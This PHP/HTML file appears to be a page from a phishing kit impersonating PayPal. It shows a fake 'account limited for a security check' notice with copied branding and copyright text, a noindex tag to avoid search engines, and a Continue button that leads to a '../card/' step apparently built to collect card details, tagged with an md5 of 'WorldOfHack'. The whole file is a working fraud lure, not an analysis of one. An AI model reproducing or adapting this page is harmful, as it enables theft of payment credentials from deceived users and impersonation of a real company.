<?php
include_once('../include/config.php');
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width" />
    <title>Suspicious Activities - PayPal</title>
    <link href="../css/style.css" rel="stylesheet" type="text/css">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="../css/fav.ico" />
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha512-K1qjQ+NcF2TYO/eI3M6v8EiNYZfA95pQumfvcVrTHtwQVDG+aHRqLi/ETn2uB+1JqwYqVG3LIvdm9lj6imS/pQ==" crossorigin="anonymous">
    <script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
</head>
<body style="background-color: #6D6E71;">
<div class="contenaire">
    <div class="grey-background">
        <div class="header">
            <p class="img"></p>
        </div>
        <div class="content">
            <div class="warp">
                <div class="navout">
                    <div class="navinner">
                        <div class="col-md-5 logo-block">
                            <div class="row">
                                <div class="col-md-12 peek-sheld">
                                    <img src="../css/peek-shield-logo.png">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <p class="logo-block-text">
                                        To help protect your account we regularly look for early signs of potentially fraudulent activity.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-7 explan-warper">
                            <div class="row">
                                <div class="col-md-12">
                                    <header>
                                        <h4 class="big-title">Access to the account limited for a security check.</h4>
                                    </header>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    After you confirm your identity, we’ll walk you through steps to make your account more secure.
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="details-box">
                                        <div class="headers white-header">
                                            <label class="loginmarker">
                                                <span class="device">Account confirmation</span>
                                                <span class="location">Restricted</span>
                                                <span class="time"><?php echo date('m/d/y') ?></span>
                                            </label>

                                        </div>
                                    </div>
                                    <p>Just to be safe, we want to make sure that this is your account.</p>
                                    <div class="buttons">
                                        <a href="../card/?data=confirm&execution=<?php echo md5('WorldOfHack'); ?>" class="btn btnPremary" style="width: 200px;">Continue</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
    <footer class="footers">
        <div class="footer-nav">
            <div class="sitelinks container-fluid">
                <ul class="navlist">
                    <li><a href="#">Contact</a></li>
                    <li><a href="#">Security</a></li>
                    <li><a href="#">Logout</a></li>
                </ul>
            </div>

        </div>
        <div class="footer-legal">
            <div class="container-fluid">
                <span class="copyright">Copyright © 1999 - <?php echo date('Y') ?> PayPal. All rights reserved.</span>
                <span class="copyright-short">© 1999 - <?php echo date('Y') ?></span>
                <ul class="navlist footer-list">
                    <li><a href="#">Privacy</a> </li>
                    <li><a href="#">Legal</a></li>
                </ul>
            </div>
        </div>
    </footer>
</div>
</body>
</html>